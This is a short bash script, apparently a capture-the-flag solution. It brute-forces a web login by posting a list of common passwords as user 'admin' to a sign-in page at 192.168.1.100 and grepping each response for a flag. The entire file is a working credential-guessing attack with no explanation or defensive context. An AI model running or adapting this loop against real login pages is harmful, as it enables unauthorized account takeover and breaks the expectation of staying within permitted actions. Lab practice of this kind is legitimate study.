#!/bin/bash

'''
    Password array gotten from a column on https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
'''

passwords=(photoshop Admin 111111 iloveyou abc123 123456789 trustno1 1234567 iloveyou adobe123 123123 password 1234567890 letmein  1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)

for index in ${passwords[@]}; do
	curl -X POST "http://192.168.1.100/index.php?page=signin&username=admin&password=${index}&Login=Login#" | grep 'The flag is'
done